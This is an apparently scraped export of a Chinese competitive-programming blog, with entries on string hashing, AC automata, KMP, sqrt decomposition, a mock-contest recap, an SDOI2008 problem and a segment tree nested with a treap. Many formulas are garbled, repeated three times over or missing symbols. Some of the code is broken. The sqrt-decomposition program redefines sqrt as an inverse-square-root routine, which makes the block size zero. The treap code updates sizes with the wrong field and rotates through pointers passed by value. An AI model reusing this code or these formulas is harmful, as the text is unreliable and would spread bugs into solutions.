个字符串，如果两个字符串只有一个位置的字符不相同，那么称这两个字符串是相似的。字符串的长度都相等，并且字符串两两不同。求一共有多少对相似字符串。，时间限制 222 秒题解如果两个字符串是相似的，那么去掉某个相同位置的字符后这两个字符串相等，去掉其他相同位置的字符后这两个字符串不等枚举删去字符的位置，然后用 hash 的方法计算相等的字符串对数. 对 hash 值构建桶或者对 hash 值排序后统计均可HNOI 2014 抄卡组题意给 nnn 个带有通配符 ∗*∗ 的字符串，通配符可以匹配任意多个字符，问这 nnn 个字符串是否可以代表同一个字符串。题解如果所有字符串都有通配符，判断前缀和后缀是不是相等就可以了。把所有字符串到通配符前的前缀拿出来，按照长度排序，Hash 判断，后缀同理。如果所有字符串都不含有通配符， Hash 判断是不是一个字符串。否则拿出一个不含通配符的字符串，如果有其他不含通配符的字符串跟它不相等直接判断出来即可。问题转化为判断一个含有通配符的串是否能等于某个不含有通配符的串，特殊处理前缀和后缀之后，贪心处理中间通配符隔开每一段，跟模版串匹配，顺次匹配成功则答案为可以，否则答案为不可以End]]></content>
      <categories>
        <category>OI</category>
      </categories>
      <tags>
        <tag>字符串</tag>
        <tag>hash</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[「字符串算法」AC自动机&&KMP自动机入门]]></title>
    <url>%2Farticles%2FKMP-AC-automaton2%2F</url>
    <content type="text"><![CDATA[字符串算法三连击在讲AC自动机之前我们先来看一下Trie树Trie 树Trie树可以用于查找一组字符串的前缀图示:最大异或和给出 nnn 个数 ，求 maxx,ymax_{x,y}max​x,y​​ aixoraja_i \;xor\; a_ja​i​​xora​j​​思路把每个数看成是一个 646464 长度的二进制串，最高位是第一个字符，对这些二进制串构造一个 Trie 树， Trie 树上记录子树内一共有多少个数考虑查询这个集合中的数与 xxx 异或的最大值，从最高位开始考虑，如果有这一位不同的就应该选择不同的那个分支。这样按照Trie 树走下去，就可以查找出来与 x 异或能得到的最大值对于 a1a_1a​1​​ 到 ana_na​n​​ 每一个都这样做一次，就得到了最大值。时间复杂度 O(nlogai)O(n \log a_i)O(nloga​i​​)First给 n 个字符串。现在你可以指定 26 个字母的大小顺序，问哪些 字符串可能在指定顺序后变成字典序第一的串。 思路首先对所有字符串构造一个 Trie 树考虑某个字符串能否是字典序最小的。如果这个字符串某个字符aaa 在 Trie 树上有同层同父亲的边，这条边上字母为 bbb，就说明这会成为一个限制，要求字符 aaa 在新的大小顺序中必须小于字符bbb把所有 aaa 小于 bbb 的限制在图中连一条 aaa 到 bbb 的有向边，如果这个图可以拓扑排序，则这个串可以是字典序最小的串。然后对所有字符串都进行判断就可以了自动机自动机的五个组成要素：状态集合 QQQ初始状态 ，只能有一个接收状态集合A⊆QA \subseteq QA⊆Q，可以有多个字母表 ∑\sum∑转移函数 δ\deltaδ : Q×∑→QQ \times \sum \rightarrow QQ×∑→Q上述只是严格的数学形式，然而像我这种大蒟蒻当然是看不懂的，就只能直接看AC自动机了AC自动机在KMP算法中，匹配单个字符的时候，我们只需要按照文本线性的扫一遍，然后中途失配的时候，next数组会引导k回溯到正确的位置进行下一步的匹配。但是多个模式串的时候要怎么匹配呢？Trie树不就是一个多模式的匹配吗，如果我们将KMP和Trie数结合起来，是不是会有意想不到的效果呢？有了这些思考，AC自动机算法就这样产生了。在AC自动机中，我们首先将每一个模式串插入到Trie树中去，建立一棵Trie树，然后构建fail指针，fail指针，顾名思义，就是当匹配失败的时候，用来引导k回溯的一个插穿在Trie树的各个节点之间的一些指针，就和KMP算法中的next数组是一样的道理。将所有的字符串构建成一个 Trie 树，按照 BFS 的顺序遍历每个节点，对每个 Trie 树上的节点维护一个 fail 指针对于每个节点，如果它有第 iii 个儿子，设为 xxx，则顺着当前节点的 fail 指针向上跳。如果跳到的节点有第 iii 个儿子，设为 yyy，则 xxx的 fail 指针指向 yyy(图不好见谅虚线为 fail 指针，可以看出与 KMP 的 next 数组相似的 “前缀等于后缀” 的关系在AC自动机上匹配在AC自动机上匹配,相当于在 Trie 树上匹配，顺着 Trie 树走就可以了。如果某次匹配是失败的，则顺着 fail 指针跳回去，直到匹配成功或者 fail 指针跳到根也没有成功。AC 自动机上每一个节点对应匹配的一种 状态，只要我们知道当前走到了 AC 自动机上的哪个节点，无需知道字符串已经匹配的内容就可以继续匹配。利用这点性质可以在这些状态上做递推等AC自动机与其他自动机的区别AC 自动机的带有 fail 指针的形式还不符合自动机的一般描述，试着把它写成一个自动机的形式。在 AC 自动机的状态 xxx 上，想象下一个需要匹配的字符是 ccc，需要顺着 fail 指针跳到一个有儿子 ccc 节点的位置。如果一直找不到，那么下一个状态应该是 Trie 树的根。注意到这个转移只跟当前状态和下一个需要匹配的字符有关，这正是一般自动机的转移函数 : 用这种方式思考递推问题会更容易KMP自动机KMP 算法就是 AC 自动机算法在单个字符串上的情形，但是因为不需要枚举字符集，所以复杂度是 O(n)O(n)O(n) 而不是 O(n∣∑∣O(n|\sum|O(n∣∑∣。一个串对应的 AC 自动机就是 KMP 自动机， KMP 过程相当于在 KMP 自动机上做匹配。 KMP 的 next 数相当于 AC 自动机的 fail 指针应用HNOI 2008 GT 考试给定一个数字串 S=S =S= 求不出现 SSS 的 nnn 位数字串有多少个 题解nnn 很大，考虑矩阵乘法。矩阵乘法本质是递推，递推的状态是什么？对 SSS 构造 AC 自动机，它上面的状态可以描述匹配的进度。f[i][j] 表示 i 位数字串中，在 AC 自动机上匹配状态为 j 的串有多少个。这里对自动机做一点小改造，如果一个串已经匹配成功了，那么不论后续出现什么数字它都已经不应该被记入答案了，所以把 AC 自动机的接受态上的所有转移都连到自己。第二维状态只有最多 mmm 个，且对于第一维来说这是一个线性递推，利用矩阵乘法优化，复杂度可以做到 O(m3logn)O(m^3 \log n)O(m​3​​logn)NOI 2011 阿狸的打字机有一个打字机，有三种操作输入一个字母删除最后一个输入的字母打印当前字符串一共进行了 nnn 次操作，有 mmm 个询问，每次询问第 iii 个打印的字符串在第 jjj 个打印的字符串中出现多少次。题解前两个操作相当于构造了一棵 trie 树，对这个 trie 树构造一个AC 自动机。串 SSS 是串 TTT 的子串等价于串 SSS 是串 TTT 一个前缀的后缀考虑在 Trie 树上询问节点 xxx 对应串在节点 yyy 对应串中出现了几次。从节点 yyy 出发，顺着 fail 指针走，如果能到达节点 xxx，说明 xxx 是yyy 的后缀所以只需要看从根节点到 yyy 的路径上，有多少个节点可以沿着fail 指针走到 xxx构造 fail 树（这棵树上 xxx 的父亲就是 xxx 的 fail 指针），离线处理后相当于这棵树上单点修改子树求和，用树状数组解决]]></content>
      <categories>
        <category>OI</category>
      </categories>
      <tags>
        <tag>Algorithm</tag>
        <tag>AC自动机</tag>
        <tag>字符串</tag>
        <tag>自动机</tag>
        <tag>Trie</tag>
        <tag>KMP自动机</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[「字符串算法」KMP算法]]></title>
    <url>%2Farticles%2FKMP-AC-automaton%2F</url>
    <content type="text"><![CDATA[字符串算法三连击本文是介绍KMP算法的运用KMP算法给定两个字符串 S,TS, TS,T，询问 TTT 是否在 SSS 中出现过，如果出现过要给出所有出现的位置，时间复杂度 O(∣S∣+∣T∣)O\left(\left|S\right| + \left|T\right|\right)O(∣S∣+∣T∣)KMP算法的核心是Next数组Next 数组定义 nextnextnext : String→IntString \rightarrow IntString→Int 函数，它表示一个字符串的最长的严格前缀等于对应长度后缀的长度next(abacaba)=3next(abacaba) = 3next(abacaba)=3，因为前缀和后缀都是 abaabaaba，并且没有更长的了next(aaaaa)=4next(aaaaa) = 4next(aaaaa)=4，因为前缀和后缀都是 aaaaaaaaaaaa，注意原串 aaaaaaaaaaaaaaa也同时是前缀和后缀，但我们要求是严格前缀next(abcde)=0next(abcde) = 0next(abcde)=0，因为不存在一个前缀等于对应长度后缀对于一个字符串 SSS，我们定义它的 nextnextnext 数组的第 iii 项为 SSS 前 iii 个字符构成的前缀的 nextnextnext 函数 对于字符串 abacabaabacabaabacaba 来说，它的 nextnextnext 数组是： next:0,0,1,0,1,2,3next : 0, 0, 1, 0, 1, 2, 3next:0,0,1,0,1,2,3算法主体如果要求 TTT 是否在 SSS 中出现过，先求 TTT 的 nextnextnext 数组（假设已经求好）记录两个指针 i,ji, ji,j，表示当前匹配到字符串 SSS的iii位置，匹配到字符串 TTT 的 jjj 位置如果 Si+1=Tj+1S_{i + 1} = T_{j + 1}S​i+1​​=T​j+1​​，该字符匹配成功， i=i+1,j=j+1i = i + 1, j = j + 1i=i+1,j=j+1如果 Si+1≠Tj+1S_{i + 1} \neq T_{j + 1}S​i+1​​≠T​j+1​​，匹配失败， j=nextjj = next_jj=next​j​​（ jjj 移动到可行的最后一个位置）如果 jjj 到末尾，说明已经匹配成功，输出匹配位置，并j=nextjj = next_jj=next​j​​，表示开始准备下一次匹配求Next数组核心思想：自己与自己错位做匹配考虑已知 next1,next2.....nextpnext_1, next_2 ..... next_pnext​1​​,next​2​​.....next​p​​，求 nextp+1next_{p + 1}next​p+1​​如果 Sp+1=Snextp+1S_{p + 1} = S_{next_p + 1}S​p+1​​=S​next​p​​+1​​，那么 nextp+1=nextp+1next_{p + 1} = next_p + 1next​p+1​​=next​p​​+1 如果不相等？判断 Sp+1=Snext[nextp]+1]S_{p + 1} = S_{next[next_p]} + 1]S​p+1​​=S​next[next​p​​]​​+1]12345for (int i = 2; i &lt;= length; i++) &#123; while (j &gt; 0 &amp;&amp; S[i] != S[j + 1]) j = next[j]; if (S[i] == S[j+1]) j++; next[i] = j;&#125;KMP在题目中的应用下面是一些KMPKMPKMP的题目周期串判断题目给定一个字符串 SSS，问 SSS 是否是周期串，也就是是否有 这样的形式。如果有找出最短的循环节，否则输出 。 题解考虑周期串有什么性质：如果 S=AkS = A_kS=A​k​​（ kkk 个 AAA 连在一起），那么 既是 SSS 的前缀也是 SSS 的后缀，也就是 的长度应该等于 next(S)next(S)next(S)如果 是 nnn 的一个约数的话，根据前缀后缀的相等关系我们可以断定 SSS 必然是周期串，又由于 next(S)next(S)next(S) 的最大性质，前 个字符一定就是最短循环节。否则 SSS 必然不是一个周期串。CEOI 2011 Match题目给出一个长度为 nnn 的排列 SSS（ 111 到 nnn 的所有数都出现一次），并给出一个长度为 mmm 的序列 TTT，求 TTT 的所有满足如下条件的子串：该子串长度为 nnn该子串的第 iii 个数恰为整个子串的第 SiS_iS​i​​ 大的数题解修改一下 KMP 算法中， Si+1=Tj+1S_{i + 1} = T_{j + 1}S​i+1​​=T​j+1​​中等号的定义.定义 sis_is​i​​ 是 SiS_iS​i​​ 在 SSS 的前 iii 位中的排名。 如果 TTT 的某个子串 ttt 中， tit_it​i​​ 的排名恰好是 sis_is​i​​，就认为ti=Sit_i = S_it​i​​=S​i​​。可以用树状数组在将 TTT 离散化后 O(logn)O(\log n)O(logn) 判定。Q: 为什么这样做是对的呢？考虑当前匹配的指针后移一位，不会影响之前的匹配结果实际上就是把排名对应相等的字符串看成是等价的字符串做匹配End.]]></content>
      <categories>
        <category>OI</category>
      </categories>
      <tags>
        <tag>Algorithm</tag>
        <tag>KMP</tag>
        <tag>AC自动机</tag>
        <tag>前缀和</tag>
        <tag>字符串</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[分块算法学习笔记]]></title>
    <url>%2Farticles%2FPartitioned-Algorithm%2F</url>
    <content type="text"><![CDATA[不知道，为什么，最近迷上了暴力数据结构，觉得十分优美这篇文章，我们就来讲一讲暴力数据结构 -- 分块算法暴力就是好看易懂quq（ 本来想学一下替罪羊树的，结果....知识储备可能涉及的几个词语解释：区间：数列中连续一段的元素区间操作：将某个区间[a,b][a,b][a,b]的所有元素进行某种改动的操作块：我们将数列划分成若干个不相交的区间，每个区间称为一个块整块：在一个区间操作时，完整包含于区间的块不完整的块：在一个区间操作时，只有部分包含于区间的块，即区间左右端点所在的两个块Step 1 - Very Easy给出一个长为nnn的数列，以及nnn个操作，操作涉及区间加法，单点查值。这是一道能用许多数据结构优化的经典题，可以用于不同数据结构训练，你也可以参考我之前的Treap详解数列分块就是把数列中每mmm个元素打包起来，达到优化算法的目的以此题为例，如果我们把每mmm个元素分为一块，共有nmn\over m​m​​n​​块，每次区间加的操作会涉及O(nm)O\left({n\over m}\right)O(​m​​n​​)个整块，以及区间两侧两个不完整的块中至多2m2m2m个元素我们给每个块设置一个加法标记（就是记录这个块中元素一起加了多少），每次操作对每个整块直接O(1)O(1)O(1)标记，而不完整的块由于元素比较少，暴力修改元素的值每次询问时返回元素的值加上其所在块的加法标记(LazyTag?)这样每次操作的复杂度是O(nm)+O(m)O({n\over m})+O(m)O(​m​​n​​)+O(m)，根据均值不等式，当mmm取n\sqrt n√​n​​​时总复杂度最低，为了方便，我们都默认下文的分块大小为n\sqrt n√​n​​​Code :123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#include&lt;iostream&gt;#include&lt;cstdio&gt;#define pi acos(-1)#define For(i,j,k) for (int i = j; i &lt; k; i++)const int MAXN = 50005;const int MMM = 998244353;const int INF = 0x7fffffff;typedef long long ll;inline int min (int a, int b) &#123; return a &gt; b ? b : a;&#125;float sqrt (float x) &#123; float xhalf = 0.5f * x; long i = *(long*)&amp;x; i = 0x5f3759df - (i &gt;&gt; 1); x = *(float *)&amp;i; x = x * (1.5f - xhalf * x * x); return x;&#125;int SlowRead () &#123; int data = 0, w = 1; char ch = 0; while (ch != '-' &amp;&amp; (ch &lt; '0' || ch &gt; '9')) ch = getchar(); if(ch == '-') w = -1, ch = getchar(); while (ch &gt;= '0' &amp;&amp; ch &lt;= '9') data = (data &lt;&lt; 1) + (data &lt;&lt; 3) + ch - '0', ch = getchar(); return data * w;&#125;int n,blo;int v[MAXN],bl[MAXN],atag[MAXN];void add (int a, int b, int c) &#123; for (int i = a; i &lt;= min(bl[a] * blo, b); i++) v[i] += c; if (bl[a] != bl[b]) for (int i = (bl[b] - 1) * blo + 1; i &lt;= b; i++) v[i] += c; for (int i = bl[a] + 1; i &lt;= bl[b] - 1; i++) atag[i] += c;&#125;int main(int argc, char const *argv[]) &#123; n = SlowRead(); blo = sqrt(n); For (i, 1, n) v[i] = SlowRead(); For (i, 1, n) bl[i] = (i - 1) / blo + 1; For (i, 1, n) &#123; int f = SlowRead(); int a = SlowRead(), b = SlowRead(), c = SlowRead(); if (f == 0) add (a,b,c); if (f == 1) printf ("%d\n", v[b] + atag[bl[b]]); &#125; return 0;&#125;Step 2 - Easy给出一个长为nnn的数列，以及nnn个操作，操作涉及区间加法，询问区间内小于某个值xxx的元素个数。有了上一题的经验，我们可以发现，数列简单分块问题实际上有三项东西要我们思考：对于每次区间操作：不完整的块 的O(n)O(\sqrt n)O(√​n​​​)个元素怎么处理？O(n)O(\sqrt n)O(√​n​​​)个 整块 怎么处理？要预处理什么信息（复杂度不能超过后面的操作）？我们先来思考只有询问操作的情况，不完整的块枚举统计即可；而要在每个整块内寻找小于一个值的元素数，于是我们不得不要求块内元素是有序的，这样就能使用二分法对块内查询，需要预处理时每块做一遍排序，复杂度O(nlogn)，每次查询在n\sqrt n√​n​​​个块内二分，以及暴力2n2 \sqrt n2√​n​​​个元素，总复杂度O(nlogn+n×nlogn)O(n\log n + n\times \sqrt n\log\sqrt n)O(nlogn+n×√​n​​​log√​n​​​)。可以通过均值不等式计算出更优的分块大小，就不展开讨论了Q: 那么区间加怎么办呢？A: 套用第一题的方法，维护一个加法标记，略有区别的地方在于，不完整的块修改后可能会使得该块内数字乱序，所以头尾两个不完整块需要重新排序，复杂度分析略。在加法标记下的询问操作，块外还是暴力，查询小于（x – 加法标记）的元素个数，块内用（x – 加法标记）作为二分的值即可。Step 3 - Easy给出一个长为nnn的数列，以及nnn个操作，操作涉及区间加法，询问区间内小于某个值xxx的前驱（比其小的最大元素）。n&lt;=100000n&lt;=100000n&lt;=100000其实是为了区分暴力和一些常数较大的写法。接着第二题的解法，其实只要把块内查询的二分稍作修改即可。不过这题其实想表达：可以在块内维护其它结构使其更具有拓展性，比如放一个 setsetset ，这样如果还有插入、删除元素的操作，会更加的方便。分块的调试检测技巧：可以生成一些大数据，然后用两份分块大小不同的代码来对拍，还可以根据运行时间尝试调整分块大小，减小常数。Step 4 - Easy给出一个长为nnn的数列，以及nnn个操作，操作涉及区间加法，区间求和。这题的询问变成了区间上的询问，不完整的块还是暴力；而要想快速统计完整块的答案，需要维护每个块的元素和，先要预处理一下。考虑区间修改操作，不完整的块直接改，顺便更新块的元素和；完整的块类似之前标记的做法，直接根据块的元素和所加的值计算元素和的增量。Step 5 - Normal给出一个长为n的数列，以及n个操作，操作涉及区间开方，区间求和。稍作思考可以发现，开方操作比较棘手，主要是对于整块开方时，必须要知道每一个元素，才能知道他们开方后的和，也就是说，难以快速对一个块信息进行更新。看来我们要另辟蹊径。不难发现，这题的修改就只有下取整开方，而一个数经过几次开方之后，它的值就会变成 0 或者 1。如果每次区间开方只不涉及完整的块，意味着不超过2√n个元素，直接暴力即可。如果涉及了一些完整的块，这些块经过几次操作以后就会都变成 0 / 1，于是我们采取一种分块优化的暴力做法，只要每个整块暴力开方后，记录一下元素是否都变成了 0 / 1，区间修改时跳过那些全为 0 / 1 的块即可。这样每个元素至多被开方不超过4次，显然复杂度没有问题。Step 6 - Normal给出一个长为nnn的数列，以及nnn个操作，操作涉及单点插入，单点询问，数据随机生成。先说随机数据的情况之前提到过，如果我们块内用数组以外的数据结构，能够支持其它不一样的操作，比如此题每块内可以放一个动态的数组，每次插入时先找到位置所在的块，再暴力插入，把块内的其它元素直接向后移动一位，当然用链表也是可以的。查询的时候类似，复杂度分析略。但是这样做有个问题，如果数据不随机怎么办？如果先在一个块有大量单点插入，这个块的大小会大大超过n\sqrt n√​n​​​，那块内的暴力就没有复杂度保证了。还需要引入一个操作：重新分块（重构）每根号nnn次插入后，重新把数列平均分一下块，重构需要的复杂度为O(n)O(n)O(n)，重构的次数为n\sqrt n√​n​​​，所以重构的复杂度没有问题，而且保证了每个块的大小相对均衡。 当然，也可以当某个块过大时重构，或者只把这个块分成两半。Step 7 - Little Hard给出一个长为nnn的数列，以及nnn个操作，操作涉及区间乘法，区间加法，单点询问。很显然，如果只有区间乘法，和Step1Step 1Step1 的做法没有本质区别，但要思考如何同时维护两种标记。我们让乘法标记的优先级高于加法（如果反过来的话，新的加法标记无法处理）若当前的一个块乘以m1m_1m​1​​后加上a1a_1a​1​​，这时进行一个乘m2m_2m​2​​的操作，则原来的标记变成m1×m2m1\times m2m1×m2，a1×m2a1\times m2a1×m2若当前的一个块乘以m1m_1m​1​​后加上a1a_1a​1​​，这时进行一个加a2a_2a​2​​的操作，则原来的标记变成m1m_1m​1​​，a1+a2a_1+a_2a​1​​+a​2​​]]></content>
      <categories>
        <category>OI</category>
      </categories>
      <tags>
        <tag>数据结构</tag>
        <tag>算法</tag>
        <tag>分块</tag>
        <tag>暴力</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[4-29模拟赛]]></title>
    <url>%2Farticles%2F18-4-29-test%2F</url>
    <content type="text"><![CDATA[４月的最后一天的模拟赛下午模拟赛，中午和Wqy dalao讨论一中午的平衡树，下午都没考到凉了，140分, rank24禁咒检验【问题描述】在古老的世界里，有一个神奇的职业叫做魔法师。 魔法师的特点是会魔法。 施放魔法需要念咒语。 在古老的世界里，有一个神奇的职业叫做码农。 码农的工作是帮助魔法师记录咒语。 码农用 0 和 1 来记录咒语，所以一个咒语可以用一个仅由 0 和 1 构成的字符 串 S 表示。 魔法师念咒语时就是把 S 从左到右读一遍。 随着 0 和 1 的默念，魔法的能量从魔法师体内涌出。 如果魔法师连续念的 4 个字符中，‘ 0’的数量不到 2 个，那么魔法师的体力 会大量消耗。如果魔法师念 S 时会出现大量消耗体力的情况，那么 S 就被称为 禁咒。例如“ 010101”不是禁咒，但“ 001101000”是禁咒，因为魔法师会在连 续念出“ 1101”。 码农的一个重要任务，就是帮助魔法师判断一条咒语是不是禁咒。 因为在古老的世界里，还没有印刷术，更没有计算机，所以信息存储全靠手 写，所以如果 S 很长，码农是不会把 S 抄下来的，只会去背下一部分。相应的， 本题的内存仅能使用 3MB。 为避免程序运行时的额外内存计入这 3MB，评测时 会开 6MB，但是你仍应当成 3MB 来写代码，只是不必担心系统抢你仅有的 3MB 内存。【输入格式】一行一个字符串 S， 表示咒语【输出格式】如果 S 是禁咒， 输出“ Yes”，否则输出“ No”【样例输入】100010101【样例输出】No 【数据规模和约定】 对于 60%的数据， 1&lt;=|S|&lt;=1000 对于 100%的数据， 1&lt;=|S|&lt;=10^7求和【问题描述】组合数 C(n,m)是从 n 个物品中取 m 个的方案数。 C(n,m)=(n!)/(m!(n-m)!) 斐波那契数列 F 满足， F[0]=F[1]=1， n≥2 时 F[n]=F[n-1]+F[n-2] 给出 n，求 C(n,0)F[0]+C(n,1)F[1]+…+C(n,n)F[n]【输入格式】一行一个数 T 表示数据组数 接下来 T 行每行一个数，表示 n【输出格式】输出 T 行， 每行一个数表示答案，对 10^9+7 取模【样例输入】3 2 5 1000【样例输出】5 89 276439883【数据规模和约定】对于 30%的数据， n&lt;=10 对于 60%的数据， n&lt;=1000 对于 100%的数据， T&lt;=1000， n&lt;=10^6反物质【问题描述】物理学家有一种假设，世界上存在反物质，反物质遇到正常的物质会发生湮 灭。 假设现在有 n 个粒子，每个粒子的种类用一个 m 以内的正整数表示。现在 要将这些粒子按一定顺序放入一个封闭空间。 封闭空间最初什么都没有。 每当放进一个粒子时，若封闭空间为空或封闭空间中的粒子和放入的粒子 种类相同，这个粒子将留在封闭空间中；若封闭空间中的粒子和放入的粒子种 类不同，则封闭空间中会有一个粒子和放入的粒子抵消（即湮灭） 。 判断是否存在一种排序方案，使得最后封闭空间中有种类编号为“ 1” 的粒 子存在。若存在，最大化最后种类编号为“ 1”的粒子个数。若多种方案，要求 字典序最小。【输入格式】第 1 行： n 和 m，用空格隔开。 第 2 到 m+1 行：第 i+1 行代表第 i 种粒子有多少个。每种粒子至少有 1 个。 保证粒子总数是 n。【输出格式】第 1 行：如果最后封闭空间中可以有编号为“ 1”的粒子存在， 输出 YES。 否则输出 NO。 如果第一行输出了 YES，还需继续输出： 第 2 行：这一行输出最后“ 1”的个数。 第 3…n+2 行：输出在能最后“ 1” 有最大数的排序方案里， 字典序最小的方 案 如果第一行输出了 NO， 就不必输出其他内容了【样例输入】5 3 2 1 2【样例输出】YES 1 1 3 2 3 1【数据规模和约定】对于 30%的数据， n&lt;=10 对于 60%的数据， n&lt;=1000 对于 100%的数据， 1&lt;=m&lt;=n&lt;=10^6T1题意有坑（可能是我理解错了quq），小于４个字符的咒语是不算禁咒的!所以被卡了两个点，然而没有用优化，第４个点也炸了T１总分40ＧＧT２，数论题目Ｔ２的数据不强，推出来一个错误的柿子还A了Ｔ３贪心GG,而且输出路径炸了，没用字典序 爆零总分140 rank24凉凉%%% Wyh Rank15以及%%% 吴清月dalao Rank2]]></content>
      <categories>
        <category>OI</category>
      </categories>
      <tags>
        <tag>模拟赛</tag>
        <tag>清北</tag>
        <tag>qbxt</tag>
        <tag>爆零</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[SDOI2008]烧水问题]]></title>
    <url>%2Farticles%2FP1984-SDOI2008-Water%2F</url>
    <content type="text"><![CDATA[今天下午数论专讲qwq然而今天的内容并不是很难（先做个水题水一发Blog洛谷链接--SDOI2008烧水问题题目题目描述把总质量为1kg1kg1kg的水分装在nnn个杯子里，每杯水的质量均为(1n)kg\left({1\over n}\right)kg(​n​​1​​)kg，初始温度均为℃。现需要把每一杯水都烧开。我们可以对任意一杯水进行加热。把一杯水的温度升高℃所需的能量为(4200×tn)J\left({4200\times t \over n}\right)\;J(​n​​4200×t​​)J，其中，“JJJ”是能量单位“焦耳”。如果一旦某杯水的温度达到℃，那么这杯水的温度就不能再继续升高，此时我们认为这杯水已经被烧开。显然地，如果直接把水一杯一杯地烧开，所需的总能量为(4200×100)J(4200\times 100)J(4200×100)J。在烧水的过程中，我们随时可以在两杯温度不同的水之间进行热传递操作。热量只能从温度较高的那杯水传递到温度较低的那杯水。由于两杯水的质量相同，所以进行热传递操作之后，原来温度较高的那杯水所降低的温度总是等于原来温度较低的那杯水所升高的温度。一旦两杯水的温度相同，热传递立刻停止。为了把问题简化，我们假设：没有进行加热或热传递操作时，水的温度不会变化。加热时所花费的能量全部被水吸收，杯子不吸收能量。热传递总是隔着杯子进行，n杯水永远不会互相混合。热传递符合能量守恒，而且没有任何的热量损耗。在这个问题里，只要求把每杯水都至少烧开一遍就可以了，而不要求最终每杯水的温度都是℃。我们可以用如下操作把两杯水烧开：先把一杯水加热到℃，花费能量(4200×1002)J\left({4200 \times 100 \over 2}\right)J(​2​​4200×100​​)J，然后两杯水进行热传递，直到它们的温度都变成50℃为止，最后把原来没有加热到℃的那杯水加热到℃，花费能量(4200×502)J\left({4200\times50\over 2}\right)J(​2​​4200×50​​)J，此时两杯水都被烧开过了，当前温度一杯℃，一杯℃，花费的总能量为(4200×75)J(4200\times 75)J(4200×75)J，比直接烧开所需的(4200×100)J(4200\times 100)J(4200×100)J少花费了的能量。你的任务是设计一个最佳的操作方案使得n杯水都至少被烧开一遍所需的总能量最少。输入输出格式输入格式：输入文件只有一个数nnn。输出格式：输出nnn杯水都至少被烧开一遍所需的最少的总能量，单位为JJJ，四舍五入到小数点后两位。输入输出样例输入样例#1：12输出样例#1：1315000.00说明1≤n≤50000题解看似这题题目很难，其实不然我们好好分析一下题目：对于每一次加热，我们都有两种操作:进行直接加热传导加热明显，我们应尽量进行2操作，才能得到最优解题目中还说了，至少被烧开一遍, 也就是说，我们可以在这个前提下进行这样的操作：烧开第iii杯将第iii杯传导导i+1i+1i+1杯重复以上步骤这就是这道题的精髓了现在，我们来看一下如何进行该操作推导：设沸腾温度为st则第一杯温度为ststst,需要加热t1=stt_1=stt​1​​=st第二杯可以中和的最高温度为st/2st/2st/2,需要加热t2=st2t_2={st\over2}t​2​​=​2​​st​​第三杯可以中和的最高温度为t3=(a/4+a)/2=5a/8,需要加热t3=3a/8第四杯可以中和的最高温度为t4=((a/8+5a/8)/2+a)/2=11a/16,需要加热t4=5/16那么，明显地，t3/t2=3/4=1-1/4, t4/t3=5/6=1−1/6t4/t3=5/6=1-1/6t4/t3=5/6=1−1/6 继续推导得t(n+1)/t(n)=1-1/2n代码:12345678910111213141516// luogu-judger-enable-o2#include &lt;iostream&gt;#include &lt;cstdio&gt;int main() &#123; int n; double ans, a; std::cin &gt;&gt; n; a = 420000.00 / n; for(int i = 1; i &lt;= n; i++)&#123; ans += a; a *= (1 - 0.5 / i); &#125; printf("%.2lf\n", ans); return 0;&#125;]]></content>
      <categories>
        <category>OI</category>
      </categories>
      <tags>
        <tag>数学</tag>
        <tag>递推</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[「树套树」线段树套平衡树]]></title>
    <url>%2Farticles%2FSegt-in-Treap%2F</url>
    <content type="text"><![CDATA[线段树套平衡树本文Shq将会介绍一种树套树 ---线段树套平衡树Treap相对来说Treap是较为容易实现的平衡树，就用这个来实现我们的平衡树了.当然，这个可以使用其他更为高级的数据结构这大概是没接触过树套树的同学接触的第一种树套树类型吧(尤其是我)这种套法一般是用外层的树维护区间信息，在外层树的每一个节点放一棵内层树，内层的树维护权值信息。比如说查区间第k大，用套平衡树的做法就是二分权值valvalval -&gt; 到这个区间对应的logloglog个线段树节点上查valvalval的rankrankrank值，加起来与目标值进行比较这种做法的空间需求是O(nlogn)O(nlogn)O(nlogn)的，由于每个元素都会在lognlognlogn个外层树节点中插入自己而时间复杂度上，除了查询区间第k大，每次操作是O(nlog2n)O(nlog_2n)O(nlog​2​​n)的，由于在lognlognlogn个外层树上都要用O(logn)O(logn)O(logn)的时间查询查询第k大是O(nlog3n)O(nlog3n)O(nlog3n)的，由于在lognlognlogn个外层树上都要用O(logn)O(logn)O(logn)的时间查询由于Treap和线段树我在上几篇文章中就详细介绍过，这里就不再介绍了传送阵:线段树: https://ishq.site/articles/SegmentTree/Treap: http://ishq.site/articles/treap/不多说了，上代码:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192#include &lt;algorithm&gt;#include &lt;iostream&gt;#include &lt;cstring&gt;#include &lt;cstdlib&gt;#include &lt;cstdio&gt;#define FILE_LOCK#define SRAND_TIME 20050201const int MAXN = 100010;int tmp;/*--------Treap Start--------*/struct Node &#123; int key, priority; int size, cnt; Node *left, *right;&#125;;Node *root;void Update (Node *root) &#123; root-&gt;size = root-&gt;left-&gt;size + root-&gt;right-&gt;size + root-&gt;key;&#125;void Right_rotate (Node *root) &#123; Node *temp = root-&gt;left; root-&gt;left = temp-&gt;right; temp-&gt;right = root; temp-&gt;size = root-&gt;size; Update(root); root = temp;&#125;void Left_rotate (Node *root) &#123; Node *temp = root-&gt;right; root-&gt;right = temp-&gt;left; temp-&gt;left = root; temp-&gt;size = root-&gt;size; Update(root); root = temp;&#125;void valueInsert (Node *root, Node *node) &#123; if (root == NULL) &#123; root = node; return ; &#125; root-&gt;size ++; if (root-&gt;key == node-&gt;key) root-&gt;cnt ++; else if (root-&gt;key &gt; node-&gt;key) &#123; valueInsert(root-&gt;left, node); if (root-&gt;left-&gt;priority &lt; root-&gt;priority) Right_rotate(root); &#125; else &#123; valueInsert(root-&gt;right, node); if (root-&gt;right-&gt;priority &lt; root-&gt;priority) Left_rotate(root); &#125;&#125;void Insert (Node *root, int key) &#123; Node *node = new Node(); node-&gt;key = key; node-&gt;size = node-&gt;cnt = 1; node-&gt;priority = rand(); valueInsert (root, node);&#125;void Delete (Node 